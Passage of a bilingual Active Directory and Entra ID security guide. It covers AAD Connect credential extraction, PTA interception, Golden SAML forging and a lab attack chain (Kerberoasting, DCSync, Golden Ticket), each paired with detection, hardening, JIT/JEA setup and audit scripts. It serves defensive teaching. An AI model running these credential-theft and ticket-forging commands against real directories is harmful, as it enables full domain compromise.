# 2 = Back up CA
# 4 = Issue and manage certificate requests
# 8 = Revoke certificates
# 16 = Change CA security settings
# 32 = Store and retrieve CA keys
# 64 = Change CA configuration

# Monitor Event ID 4886 (Certificate Services received a certificate request)
# Monitor Event ID 4887 (Certificate Services approved a certificate request)
# Monitor Event ID 4899 (Certificate template was updated)
```

---

## 9. Azure AD / Entra ID Security

### 9.1 Hybrid Identity Architecture

Most enterprise environments operate in hybrid mode — on-premises AD synced to Azure AD (now Entra ID) via Azure AD Connect.

**Sync methods:**
- **PHS (Password Hash Synchronization)**: Syncs an additional hash of the on-prem NT hash to Azure AD. Most common.
- **PTA (Pass-through Authentication)**: Auth requests to Azure AD are forwarded to on-prem PTA agents. No password data in cloud.
- **ADFS (Active Directory Federation Services)**: SAML/WS-Fed federation. Most complex, most attack surface.

```
┌────────────────────┐        ┌─────────────────────┐
│   On-Premises AD   │◄──────►│   Azure AD Connect  │
│   (Tier 0 asset)   │        │   (Tier 0 asset!)   │
└────────────────────┘        └──────────┬──────────┘
                                         │ Sync
                                         ▼
                              ┌─────────────────────┐
                              │    Azure AD /        │
                              │    Entra ID          │
                              │    (Cloud directory) │
                              └─────────────────────┘
```

**Critical insight**: Azure AD Connect has full DCSync-equivalent rights to on-premises AD AND Global Admin-equivalent access to Azure AD. It is a Tier 0 asset. Compromise of the AAD Connect server = compromise of both environments.

### 9.2 Azure AD Connect Abuse

```powershell
# Extract Azure AD Connect credentials (requires local admin on AADConnect server)
# Tool: AADInternals (PowerShell module)
Install-Module AADInternals -Force
Import-Module AADInternals

# Extract credentials from AAD Connect database
Get-AADIntSyncCredentials
# Returns: plaintext username + password of the sync account
# This account has DCSync rights on-premises AND cloud write access

# With these credentials, perform DCSync from anywhere
impacket-secretsdump DOMAIN.LOCAL/MSOL_USER:password@dc01.domain.local
```

**Hardening AAD Connect:**
- Treat the AAD Connect server as Tier 0 (same security as DCs)
- Use a dedicated service account with minimal required permissions
- Enable MFA for the cloud sync admin account
- Monitor sign-ins from the sync account for anomalies
- Deploy on a hardened server with no internet browsing
- Use PHS over PTA/ADFS when possible (smallest attack surface)

### 9.3 PHS/PTA/ADFS Compromise Scenarios

#### PHS Compromise
If PHS sync account is compromised, attacker can:
- DCSync all on-prem passwords
- Modify cloud attributes
- Inject backdoor credentials

#### PTA Agent Compromise
If a PTA agent server is compromised:
- Intercept all authentication requests
- Accept any password for any user (authentication bypass)
- Harvest cleartext passwords in transit

```powershell
# PTA abuse (on compromised PTA agent)
# Using AADInternals
Install-AADIntPTASpy  # Installs a credential interceptor
Get-AADIntPTASpyLog   # View intercepted credentials
```

#### ADFS Compromise (Golden SAML)
Compromise of ADFS token signing certificate allows forging SAML assertions for any user — equivalent to Golden Ticket for cloud resources.

```powershell
# Extract ADFS token signing certificate
# (Requires DA or local admin on ADFS server)
# Tool: ADFSDump (from FireEye/Mandiant)
ADFSDump.exe /output:adfs_config.xml

# Forge SAML token with stolen signing certificate
# Tool: ADFSpoof
python3 ADFSpoof.py -b adfs_config.xml \
    -s token_signing_cert.pfx \
    forge --domain domain.local --target https://outlook.office365.com \
    --nameid admin@domain.local --objectsid S-1-5-21-XXX-500
```

### 9.4 Conditional Access Bypass

Conditional Access policies control access to cloud resources based on conditions (location, device, risk, app). Common bypasses:

- **Legacy authentication protocols**: If Basic Auth is not blocked, tools like `roadrecon` or direct IMAP/POP3 can bypass MFA
- **Device code phishing**: Trick user into entering attacker's device code → get tokens without MFA
- **Token theft**: Steal session cookies or refresh tokens from compromised workstations
- **Compliant device bypass**: Register attacker device as compliant (if Intune enrollment is unrestricted)

```powershell
# Enumerate Conditional Access policies (requires read access)
# Using Microsoft Graph API
Connect-MgGraph -Scopes "Policy.Read.All"
Get-MgIdentityConditionalAccessPolicy | ForEach-Object {
    [PSCustomObject]@{
        DisplayName = $_.DisplayName
        State = $_.State
        GrantControls = $_.GrantControls.BuiltInControls -join ","
        Users = $_.Conditions.Users.IncludeUsers -join ","
        Platforms = $_.Conditions.Platforms.IncludePlatforms -join ","
    }
}
```

**Hardening Conditional Access:**
- Block legacy authentication (Basic Auth) globally
- Require MFA for all users, all apps (no exceptions for "trusted locations" without device compliance)
- Require compliant/hybrid-joined devices for sensitive apps
- Enable sign-in risk-based policies (Identity Protection)
- Block token persistence on unmanaged devices
- Use Continuous Access Evaluation (CAE) for near-real-time token revocation

### 9.5 Token Manipulation and Theft

```bash
# Primary Refresh Token (PRT) extraction
# PRT is stored in the TPM or LSASS — grants SSO to Azure AD resources
# Tool: ROADtools (by Dirk-jan Mollema)
roadrecon auth --prt-cookie <cookie_from_browser>
roadrecon gather  # Enumerate entire Azure AD tenant

# Device code phishing
# Generate device code
az login --use-device-code
# Social-engineer victim into entering the code at https://microsoft.com/devicelogin
# Attacker receives tokens
```

### 9.6 Cloud-Only vs Hybrid Attack Paths

**Hybrid attack paths (on-prem → cloud):**
1. Compromise on-prem user → Synced to Azure AD → Access cloud resources
2. Compromise AAD Connect → DCSync on-prem + cloud admin
3. Compromise ADFS → Golden SAML → Any cloud resource
4. Compromise PTA → Intercept/bypass cloud auth

**Cloud-only attack paths:**
1. Phishing → Global Admin token → Full tenant control
2. Application consent phishing → OAuth app with Mail.Read, Files.ReadWrite
3. Illicit consent grant → Persistence via OAuth application
4. Service Principal abuse → Workload identity compromise

```powershell
# Enumerate Azure AD attack surface with AzureHound (BloodHound for Azure)
# Collect data
azurehound list -u user@domain.local -p password --tenant tenant-id -o azurehound.json

# Import to BloodHound
# Query: find path from owned user to Global Admin
MATCH p=shortestPath((u:AZUser {name:"compromised@domain.local"})-[*1..]->(t:AZRole {name:"Global Administrator"}))
RETURN p
```

---

## 10. Laboratorio Pratico

### 10.1 Building a Vulnerable AD Lab

**Option 1: GOAD (Game of Active Directory)**

GOAD provides a pre-built vulnerable AD lab with multiple domains, trusts, and misconfigurations.

```bash
# Clone GOAD
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD

# Prerequisites: Vagrant, VirtualBox/VMware/Proxmox, Ansible
# Install dependencies
pip install ansible-core
ansible-galaxy install -r ansible/requirements.yml

# Deploy (VirtualBox provider)
cd ad/GOAD/providers/virtualbox
vagrant up

# Run provisioning (configures AD, misconfigurations, users)
cd ../../
ansible-playbook -i ../ad/GOAD/data/inventory main.yml
```

**GOAD lab structure:**
- 2 forests, 3 domains, multiple trust relationships
- Pre-configured vulnerabilities: Kerberoastable accounts, ASREPRoastable users, ADCS misconfigurations, ACL abuses, delegation misconfigurations
- Multiple attack paths to Domain Admin

**Option 2: DVAD (Damn Vulnerable Active Directory)**

```bash
# Clone DVAD
git clone https://github.com/WazeHell/vulnerable-AD.git
cd vulnerable-AD

# Deploy on existing Windows Server (run as admin)
powershell -ep bypass .\vulnad.ps1
# Creates vulnerable AD configuration on single DC
```

**Option 3: Manual Lab Build**

```powershell
# Minimum lab: 1 DC + 1 workstation + 1 member server
# DC setup
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local" -DomainNetBIOSName "LAB" `
    -InstallDns -SafeModeAdministratorPassword (ConvertTo-SecureString "LabP@ss2024!" -AsPlainText -Force)

# Create vulnerable misconfigurations for lab
# 1. Kerberoastable service account
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
    -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/sql.lab.local:1433"}
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_sql"

# 2. ASREPRoastable account
Set-ADAccountControl -Identity "vuln_user" -DoesNotRequirePreAuth $true

# 3. Unconstrained delegation
Set-ADComputer -Identity "WEB01$" -TrustedForDelegation $true

# 4. ACL misconfiguration (GenericAll for a user on Domain Admins)
$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=lab,DC=local"
$identity = New-Object System.Security.Principal.NTAccount("LAB\attacker_user")
$rights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$type = [System.Security.AccessControl.AccessControlType]::Allow
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $identity, $rights, $type)
$acl.AddAccessRule($ace)
Set-Acl "AD:\CN=Domain Admins,CN=Users,DC=lab,DC=local" $acl

# 5. ADCS vulnerable template (ESC1)
# Duplicate an existing template, enable enrollee supplies subject,
# grant enrollment to Domain Users, add Client Authentication EKU
```

### 10.2 Full Attack Chain Walkthrough

**Phase 1: Enumeration**

```bash
# Network discovery
nmap -sV -sC -p 53,88,135,139,389,445,464,636,3268,3269,5985 10.0.0.0/24

# Anonymous LDAP enumeration
ldapsearch -x -H ldap://10.0.0.1 -b "DC=lab,DC=local" -s base namingContexts
ldapsearch -x -H ldap://10.0.0.1 -b "DC=lab,DC=local" "(objectClass=user)" sAMAccountName

# Authenticated enumeration with initial foothold
# BloodHound collection
bloodhound-python -u user -p password -d lab.local -ns 10.0.0.1 -c All
# Import JSON files into BloodHound GUI

# PowerView enumeration (from compromised Windows host)
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName  # Kerberoastable
Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName          # ASREPRoastable
Get-DomainComputer -Unconstrained | Select-Object DNSHostName             # Unconstrained delegation
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "user"}
```

**Phase 2: Credential Access — Kerberoasting**

```bash
# Identify high-value kerberoastable accounts
impacket-GetUserSPNs lab.local/user:password -dc-ip 10.0.0.1 -request \
    -outputfile krb_hashes.txt

# Crack the hash
hashcat -m 13100 krb_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule --force

# Result: svc_sql:Summer2024!
# svc_sql is member of Domain Admins
```

**Phase 3: Privilege Escalation**

```bash
# Verify DA access
nxc smb 10.0.0.1 -u svc_sql -p 'Summer2024!' -d lab.local

# Alternative path via ACL abuse (if kerberoasting doesn't yield DA)
# User has GenericAll on Domain Admins group
# Add ourselves to Domain Admins
net rpc group addmem "Domain Admins" "attacker_user" \
    -U lab.local/attacker_user%password -S 10.0.0.1
```

**Phase 4: Domain Admin Operations**

```bash
# DCSync — extract all credentials
impacket-secretsdump lab.local/svc_sql:'Summer2024!'@10.0.0.1 \
    -just-dc-ntlm -outputfile domain_dump

# Extract krbtgt hash
grep krbtgt domain_dump.ntds
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_HERE:::

# Remote code execution on DC
impacket-psexec lab.local/svc_sql:'Summer2024!'@10.0.0.1
```

**Phase 5: Persistence**

```bash
# Golden Ticket (10-year persistence)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX \
    -domain lab.local -duration 87600 Administrator

# ADCS persistence — enroll certificate valid for 5 years
certipy req -u svc_sql@lab.local -p 'Summer2024!' -ca LAB-CA \
    -template User -upn administrator@lab.local

# AdminSDHolder persistence
# Objects in AdminSDHolder propagate ACLs to all protected groups every 60 min
# Add backdoor ACE to AdminSDHolder
```

### 10.3 Implementing Hardening and Verifying Detection

After executing the attack chain, implement all hardening measures and verify detection:

```powershell
# === HARDENING IMPLEMENTATION ===

# 1. Fix Kerberoasting targets
# Change service account passwords to 30+ character random strings
# Convert to gMSA where possible
New-ADServiceAccount -Name "gMSA-SQL" -DNSHostName "gmsa-sql.lab.local" `
    -PrincipalsAllowedToRetrieveManagedPassword "SQLServers" `
    -KerberosEncryptionType AES256

# 2. Fix ASREPRoasting
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} |
    Set-ADAccountControl -DoesNotRequirePreAuth $false

# 3. Fix unconstrained delegation
Set-ADComputer -Identity "WEB01$" -TrustedForDelegation $false
# Replace with constrained or RBCD where needed

# 4. Fix ACL misconfigurations
# Remove dangerous ACEs
$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=lab,DC=local"
$acl.Access | Where-Object {
    $_.IdentityReference -match "attacker_user" -and
    $_.ActiveDirectoryRights -match "GenericAll"
} | ForEach-Object { $acl.RemoveAccessRule($_) }
Set-Acl "AD:\CN=Domain Admins,CN=Users,DC=lab,DC=local" $acl

# 5. Deploy Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members svc_sql, admin1

# 6. Enable advanced auditing
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# 7. Rotate krbtgt
.\New-KrbtgtKeys.ps1 -Mode 2

# 8. Fix ADCS templates
# Remove vulnerable templates from publication
# certipy find to verify no ESC vulnerabilities remain

# 9. Require SMB signing everywhere
# Deploy via GPO to all computers

# 10. Deploy LAPS
# Already covered in section 6.3
```

**Verification — Re-run Attacks and Confirm Detection:**

```powershell
# === DETECTION VERIFICATION ===

# Re-attempt kerberoasting → should generate alerts
# Check Event Log for 4769 with RC4 encryption type
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} -MaxEvents 10 |
    Where-Object { $_.Properties[5].Value -eq "0x17" }

# Re-attempt DCSync from non-DC → should trigger 4662 alert
# Verify Defender for Identity alert fires

# Attempt AS-REP roast → should fail (pre-auth required now)
impacket-GetNPUsers lab.local/ -usersfile users.txt -dc-ip 10.0.0.1
# Expected: no vulnerable accounts found

# Test NTLM relay → should fail (SMB signing required)
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# Expected: empty file

# Test honey account → verify alert triggers
# Attempt authentication as honey account
nxc smb 10.0.0.1 -u svc_backup_admin -p 'HoneyP@ss2024!ComplexEnough'
# Expected: immediate SIEM alert

# Verify credential protection
# Attempt LSASS dump on Credential Guard system → should fail
# Attempt PtH on Protected Users member → should fail (NTLM blocked)
```

### 10.4 Automazione della Verifica Continua

```powershell
# Scheduled BloodHound collection for continuous monitoring
# Run weekly to detect new attack paths
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -File C:\Tools\Invoke-BloodHound.ps1 -CollectionMethod All -OutputDirectory C:\BloodHound\Weekly"
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At 2am
Register-ScheduledTask -TaskName "BloodHound-Weekly" -Action $action `
    -Trigger $trigger -RunLevel Highest -User "SYSTEM"

# PingCastle automated scoring (monthly)
# PingCastle provides an AD security score and identifies risks
# Run: PingCastle.exe --healthcheck --server dc01.lab.local
# Score should decrease (improve) after hardening

# Purple Knight (by Semperis) — another AD security assessment
# Scans for 130+ indicators of exposure (IOEs) and compromise (IOCs)
```

---

## Appendice A — Quick Reference: Attack → Detection → Hardening

| Attack | Detection (Event ID) | Hardening Measure |
|--------|---------------------|-------------------|
| Kerberoasting | 4769 (RC4 encryption) | gMSA, 30+ char passwords, AES-only |
| AS-REP Roasting | 4768 (no pre-auth) | Enable pre-auth on all accounts |
| Golden Ticket | 4768 anomaly, Defender for Identity | krbtgt rotation, PAC validation |
| Silver Ticket | Service-specific (no DC event) | AES-only services, PAC validation |
| DCSync | 4662 (replication GUIDs) | Audit DCSync rights, reduce members |
| Pass-the-Hash | 4624 (Type 3 + NTLM) | Credential Guard, disable NTLM |
| NTLM Relay | 4624 (source mismatch) | SMB signing, LDAP signing, EPA |
| PsExec | 7045 (service install) | Block ADMIN$ access, monitor services |
| ACL Abuse | 5136 (object modified) | Regular ACL audits, BloodHound |
| ADCS ESC1-8 | 4886/4887 (cert issued) | Template hardening, CA auditing |
| Shadow Credentials | 5136 (KeyCredentialLink) | Monitor attribute, limit write access |
| Skeleton Key | Defender for Identity | LSASS protection, DC restart schedule |
| DCShadow | 4742 + DNS changes | Monitor new nTDSDSA objects |
| PrinterBug | N/A (legitimate call) | Disable Print Spooler on DCs |
| PetitPotam | N/A (EFS RPC) | Disable EFS, require auth, EPA |
| RBCD | 5136 (delegation attr) | Set MachineAccountQuota=0 |

---

## Appendice B — Strumenti Essenziali

| Tool | Language | Purpose | Link |
|------|----------|---------|------|
| Mimikatz | C | Credential extraction, ticket forging | github.com/gentilkiwi/mimikatz |
| Rubeus | C# | Kerberos abuse (roasting, tickets, delegation) | github.com/GhostPack/Rubeus |
| Impacket | Python | Remote AD attacks (DCSync, relay, exec) | github.com/fortra/impacket |
| BloodHound | JS/Go | AD attack path mapping | github.com/BloodHoundAD/BloodHound |
| SharpHound | C# | BloodHound data collector | Included with BloodHound |
| Certipy | Python | AD CS enumeration and exploitation | github.com/ly4k/Certipy |
| NetExec (nxc) | Python | Network-wide credential testing | github.com/Pennyw0rth/NetExec |
| PingCastle | C# | AD security assessment | pingcastle.com |
| Purple Knight | N/A | AD security posture scoring | semperis.com/purple-knight |
| AADInternals | PowerShell | Azure AD/Entra ID attacks | github.com/Gerenios/AADInternals |
| ROADtools | Python | Azure AD enumeration | github.com/dirkjanm/ROADtools |
| Responder | Python | LLMNR/NBT-NS poisoning | github.com/lgandx/Responder |
| PowerView | PowerShell | AD enumeration and exploitation | Part of PowerSploit |
| ADCSTemplate | PowerShell | Certificate template management | github.com/GoateePFE/ADCSTemplate |

---

## Appendice C — GPO Hardening Checklist

```
□ Computer Configuration → Policies → Windows Settings → Security Settings
  □ Account Policies
    □ Password Policy: 15+ chars, complexity, 90-day max age
    □ Account Lockout: 5 attempts, 30 min lockout, 30 min reset
    □ Kerberos Policy: TGT lifetime 4h (Tier 0), 10h (others)
  □ Local Policies → User Rights Assignment
    □ Deny log on locally: Tier 0 accounts on Tier 1/2 systems
    □ Deny access from network: Tier 0 accounts on Tier 1/2 systems
    □ Deny log on through RDP: Tier 0 accounts on Tier 1/2 systems
  □ Local Policies → Security Options
    □ Network security: LAN Manager auth level = Send NTLMv2 only, Refuse LM/NTLM
    □ Network security: LDAP client signing = Require signing
    □ Network security: Restrict NTLM = Deny all (after audit)
    □ Microsoft network server: Digitally sign communications = Always
    □ Microsoft network client: Digitally sign communications = Always
    □ Domain controller: LDAP server signing requirements = Require signing
  □ Advanced Audit Policy
    □ Logon/Logoff: Audit Logon (S+F)
    □ Account Logon: Audit Kerberos Authentication Service (S+F)
    □ Account Logon: Audit Kerberos Service Ticket Operations (S+F)
    □ Account Logon: Audit Credential Validation (S+F)
    □ DS Access: Audit Directory Service Access (S+F)
    □ DS Access: Audit Directory Service Changes (S+F)
    □ Object Access: Audit SAM (S+F)
  □ Administrative Templates
    □ Network → DNS Client → Turn off multicast name resolution = Enabled
    □ System → Credentials Delegation → Restrict delegation of credentials = Enabled
    □ System → Device Guard → VBS = Enabled (Credential Guard)
    □ MS Security Guide → WDigest Authentication = Disabled
    □ LAPS → Enable password management = Enabled
```

---

## Appendice D — Risorse e Riferimenti

- Microsoft: "Best Practices for Securing Active Directory" (docs.microsoft.com)
- SpecterOps: "Certified Pre-Owned" — AD CS abuse whitepaper
- Sean Metcalf (adsecurity.org) — Comprehensive AD security research
- harmj0y: BloodHound documentation and attack primitives
- Dirk-jan Mollema: krbrelayx, PKINITtools, Azure AD research
- MITRE ATT&CK — Techniques: T1558 (Steal or Forge Kerberos Tickets), T1003 (OS Credential Dumping), T1550 (Use Alternate Authentication Material)
- ANSSI: "Active Directory Security" technical guides (cert.ssi.gouv.fr)
- Microsoft DART: "Incident Response Playbook for Active Directory"
- Orange Cyberdefense: GOAD project and AD attack workshops
- CISA: "Detecting and Mitigating Active Directory Compromises" (2024-2025)
- Microsoft: "Active Directory Hardening Series" — Enforcing AES for Kerberos (techcommunity.microsoft.com)
- RedTeam Pentesting: "The Ultimate Guide to Windows Coercion Techniques" (2025)
- SpecterOps: "DPAPI Backup Key Compromise" research series (2025)
- NCC Group: "Defending Your Directory: Expert Guide to Fortifying ADCS" (2025)

---

## 11. Enterprise Access Model — Evoluzione dal Modello a Livelli

### 11.1 Dal Tiered Model all'Enterprise Access Model

Il modello tradizionale a tre livelli (Tier 0/1/2) descritto nella Sezione 6.1 rimane valido come fondamento architetturale per l'isolamento delle credenziali on-premises. Tuttavia, Microsoft ha evoluto questo concetto nell'**Enterprise Access Model** (EAM), che estende i principi di segmentazione oltre Active Directory per coprire l'intera superficie di accesso moderna: cloud, SaaS, DevOps, e workload identity.

**Differenze chiave tra Tiered Model e Enterprise Access Model:**

| Aspetto | Tiered Model (Legacy) | Enterprise Access Model |
|---------|----------------------|-------------------------|
| Scope | Solo on-premises AD | On-premises + Cloud + SaaS + DevOps |
| Livelli | Tier 0/1/2 | Control Plane, Management Plane, Data/Workload Plane, User Access |
| Identity | Solo AD accounts | AD + Entra ID + workload identity + service principals |
| Accesso privilegiato | Account separati per tier | Just-in-Time (JIT) + Just-Enough-Administration (JEA) |
| Governance | GPO-centric | Policy-centric (Conditional Access + PIM + Authentication Context) |
| Monitoraggio | Event log + SIEM | Unified SecOps (Sentinel + Defender XDR + Identity Protection) |

**Architettura Enterprise Access Model:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    CONTROL PLANE                                 │
│  Identità e infrastruttura di sicurezza                         │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────────┐  │
│  │ Domain    │ │ Entra ID │ │ AD CS /  │ │ Security         │  │
│  │ Controllers│ │ Tenant   │ │ PKI      │ │ Infrastructure   │  │
│  │          │ │ Config   │ │          │ │ (SIEM, PAM, CA)  │  │
│  └──────────┘ └──────────┘ └──────────┘ └──────────────────┘  │
│  Equivalente: Tier 0 + Cloud identity administration            │
├─────────────────────────────────────────────────────────────────┤
│                   MANAGEMENT PLANE                               │
│  Amministrazione di server, applicazioni e servizi cloud        │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────────┐  │
│  │ Member   │ │ Azure    │ │ M365     │ │ DevOps           │  │
│  │ Servers  │ │ Resources│ │ Admin    │ │ Pipelines        │  │
│  └──────────┘ └──────────┘ └──────────┘ └──────────────────┘  │
│  Equivalente: Tier 1 + Cloud workload administration            │
├─────────────────────────────────────────────────────────────────┤
│                DATA / WORKLOAD PLANE                             │
│  Dati aziendali, applicazioni, database                         │
│  Equivalente: asset protetti (non account di amministrazione)   │
├─────────────────────────────────────────────────────────────────┤
│                   USER ACCESS                                    │
│  Workstation, dispositivi, accesso utente finale                │
│  Equivalente: Tier 2 + BYOD + accesso esterno                  │
└─────────────────────────────────────────────────────────────────┘
```

### 11.2 Implementazione Pratica del Control Plane

Il Control Plane richiede il massimo livello di protezione. Ogni componente che può influenzare l'identità di tutti gli utenti o la configurazione di sicurezza dell'intera organizzazione appartiene a questo piano.

**Asset del Control Plane (lista completa):**

- Domain Controllers (tutti)
- Server Azure AD Connect / Entra Connect
- Server AD FS (se utilizzati)
- Certification Authority (Root e Issuing CA)
- Server PAM (CyberArk, BeyondTrust, Delinea)
- Hypervisor che ospitano DC virtualizzati
- Server SIEM primari
- Console di gestione Entra ID con ruoli Global Admin
- Key Vault / HSM per chiavi critiche

```powershell
# === SCRIPT DI AUDIT COMPLETO CONTROL PLANE ===
# Identifica tutti gli asset che dovrebbero essere classificati Control Plane

Write-Host "=== AUDIT CONTROL PLANE ===" -ForegroundColor Cyan

# 1. Domain Controllers
Write-Host "`n[+] Domain Controllers:" -ForegroundColor Green
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address, OperatingSystem,
    IsGlobalCatalog, IsReadOnly | Format-Table -AutoSize

# 2. Account con diritti DCSync (replicazione)
Write-Host "`n[+] Account con diritti di replica (DCSync):" -ForegroundColor Green
$domainDN = (Get-ADDomain).DistinguishedName
$replicationGUIDs = @(
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes-All
    "89e95b76-444d-4c62-991a-0facbeda640c"   # DS-Replication-Get-Changes-In-Filtered-Set
)
$acl = Get-Acl "AD:\$domainDN"
$acl.Access | Where-Object {
    $replicationGUIDs -contains $_.ObjectType.ToString()
} | Select-Object IdentityReference, ObjectType,
    @{N='Diritto';E={
        switch ($_.ObjectType.ToString()) {
            "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" { "Get-Changes" }
            "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" { "Get-Changes-All" }
            "89e95b76-444d-4c62-991a-0facbeda640c" { "Get-Changes-Filtered" }
        }
    }
} | Format-Table -AutoSize

# 3. Server Azure AD Connect
Write-Host "`n[+] Server Azure AD Connect:" -ForegroundColor Green
Get-ADUser -Filter {Description -like "*Azure AD Connect*" -or
    Description -like "*Entra Connect*" -or
    SamAccountName -like "MSOL_*"} -Properties Description |
    Select-Object SamAccountName, Description

# 4. Account nella foresta con Enterprise Admin / Schema Admin
Write-Host "`n[+] Enterprise Admins:" -ForegroundColor Green
Get-ADGroupMember -Identity "Enterprise Admins" -Recursive |
    Select-Object Name, ObjectClass, SamAccountName | Format-Table -AutoSize

Write-Host "`n[+] Schema Admins:" -ForegroundColor Green
Get-ADGroupMember -Identity "Schema Admins" -Recursive |
    Select-Object Name, ObjectClass, SamAccountName | Format-Table -AutoSize

# 5. Certification Authority
Write-Host "`n[+] Enterprise CA registrate:" -ForegroundColor Green
Get-ADObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" `
    -Filter * -Properties dNSHostName, cACertificate |
    Select-Object Name, dNSHostName | Format-Table -AutoSize

# 6. Gruppi con privilegi elevati e membri atipici
Write-Host "`n[+] Gruppi privilegiati con numero membri:" -ForegroundColor Green
$privilegedGroups = @(
    "Domain Admins", "Enterprise Admins", "Schema Admins",
    "Administrators", "Account Operators", "Server Operators",
    "Backup Operators", "Print Operators", "DnsAdmins"
)
foreach ($group in $privilegedGroups) {
    try {
        $members = Get-ADGroupMember -Identity $group -ErrorAction SilentlyContinue
        $count = ($members | Measure-Object).Count
        Write-Host "  $group : $count membri" -ForegroundColor $(if ($count -gt 5) {"Yellow"} else {"White"})
    } catch {
        Write-Host "  $group : non trovato" -ForegroundColor DarkGray
    }
}
```

### 11.3 Just-in-Time e Just-Enough-Administration

L'accesso privilegiato permanente (standing access) rappresenta un rischio significativo: se un account con privilegi Domain Admin viene compromesso, l'attaccante ha accesso illimitato fino al rilevamento. Il modello JIT/JEA elimina o riduce drasticamente questo rischio.

**Just-in-Time (JIT) — Accesso privilegiato temporaneo:**

L'amministratore richiede l'elevazione dei privilegi solo quando necessario. L'accesso viene concesso per un periodo limitato (tipicamente 1-8 ore) e poi automaticamente revocato.

```powershell
# === IMPLEMENTAZIONE JIT CON MICROSOFT ENTRA PIM ===

# Prerequisito: licenza Entra ID P2 o Entra ID Governance

# 1. Configurare un ruolo Entra ID come "eligible" (non permanente)
# Via PowerShell Microsoft.Graph:
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

# Trovare il ruolo Global Administrator
$role = Get-MgDirectoryRoleTemplate | Where-Object { $_.DisplayName -eq "Global Administrator" }

# Creare un'assegnazione "eligible" con durata massima di attivazione 2 ore
$params = @{
    PrincipalId = "<user-object-id>"
    RoleDefinitionId = $role.Id
    DirectoryScopeId = "/"
    Action = "adminAssign"
    ScheduleInfo = @{
        StartDateTime = (Get-Date)
        Expiration = @{
            Type = "afterDuration"
            Duration = "P365D"  # L'eleggibilità dura un anno
        }
    }
}
New-MgRoleManagementDirectoryRoleEligibilityScheduleRequest -BodyParameter $params

# 2. Configurare le policy di attivazione
# Richiedere MFA, giustificazione, e approvazione per ruoli critici
$policyParams = @{
    Rules = @(
        @{
            RuleType = "RoleManagementPolicyAuthenticationContextRule"
            IsEnabled = $true
            ClaimValue = "c1"  # Authentication Context per Conditional Access
        },
        @{
            RuleType = "RoleManagementPolicyApprovalRule"
            Setting = @{
                IsApprovalRequired = $true
                ApprovalStages = @(@{
                    PrimaryApprovers = @(@{
                        "@odata.type" = "#microsoft.graph.groupMembers"
                        GroupId = "<security-approvers-group-id>"
                    })
                })
            }
        }
    )
}
```

**Just-Enough-Administration (JEA) — PowerShell Constrained Endpoints:**

JEA limita quali cmdlet e parametri un amministratore può utilizzare durante una sessione PowerShell remota. L'amministratore vede solo i comandi autorizzati per il suo ruolo.

```powershell
# === CONFIGURAZIONE JEA PER AMMINISTRAZIONE DNS ===

# 1. Creare il Role Capability file (.psrc)
$roleCapPath = "C:\Program Files\WindowsPowerShell\Modules\JEA-DNS\RoleCapabilities"
New-Item -Path $roleCapPath -ItemType Directory -Force

New-PSRoleCapabilityFile -Path "$roleCapPath\DNSAdmin.psrc" `
    -ModulesToImport DnsServer `
    -VisibleCmdlets @(
        "Get-DnsServerZone",
        "Get-DnsServerResourceRecord",
        "Add-DnsServerResourceRecordA",
        "Add-DnsServerResourceRecordCName",
        "Remove-DnsServerResourceRecord",
        "Set-DnsServerResourceRecord"
    ) `
    -VisibleFunctions @() `
    -VisibleExternalCommands @("nslookup.exe", "ipconfig.exe") `
    -VisibleProviders @() `
    -FunctionDefinitions @(
        @{
            Name = "Get-DNSReport"
            ScriptBlock = { Get-DnsServerZone | ForEach-Object {
                Get-DnsServerResourceRecord -ZoneName $_.ZoneName
            }}
        }
    )

# 2. Creare il Session Configuration file (.pssc)
New-PSSessionConfigurationFile -Path "C:\JEA\DNSAdmin.pssc" `
    -SessionType RestrictedRemoteServer `
    -RunAsVirtualAccount `
    -TranscriptDirectory "C:\JEA\Transcripts" `
    -RoleDefinitions @{
        "DOMAIN\DNS-Admins" = @{ RoleCapabilities = "DNSAdmin" }
    }

# 3. Registrare l'endpoint JEA
Register-PSSessionConfiguration -Name "DNSAdmin" `
